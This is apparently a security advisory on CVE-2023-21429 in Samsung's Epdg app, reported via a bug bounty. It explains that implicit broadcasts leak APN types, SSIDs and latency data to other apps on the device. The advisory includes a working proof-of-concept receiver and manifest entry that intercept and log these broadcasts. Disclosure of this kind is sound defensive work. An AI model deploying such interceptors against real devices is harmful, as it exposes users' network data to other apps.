# Details

<table>
    <tr>
        <td>Name</td>
        <td>Epdg</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.sec.epdg</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.09.20</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2023.01.04</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Moderate</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-21429">CVE-2023-21429</a> (SVE-2022-2338)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$970</td>
    </tr>
</table>

# Description

Oversecured report:
![](Oversecured_report.png)

Oversecured found multiple uses of implicit intents in the Epdg app to send broadcasts. They contained sensitive data such as APN types, SSIDs, DTD latencies. These intents could have been intercepted by any third-party apps installed on the same device.

**Proof of Concept**

File `AndroidManifest.xml`:
```xml
<receiver android:name=".MyReceiver" android:exported="true">
    <intent-filter>
        <action android:name="com.sec.epdg.DPD_LATENCY" />
        <action android:name="com.sec.epdg.PERIODIC_DPD_TIMER_EXPIRED" />
    </intent-filter>
</receiver>
```

File `MyReceiver.java`:
```java
public class MyReceiver extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        DumpUtils.dump(intent, context.getClassLoader());
    }
}
```

The implementation of the `DumpUtils.dump()` method can be found in the source code. We use the functionality of the Gson library to turn objects of any class into a string and then dump it to the log.

## References

- [Oversecured Blog. Interception of Android implicit intents](https://blog.oversecured.com/Interception-of-Android-implicit-intents/)
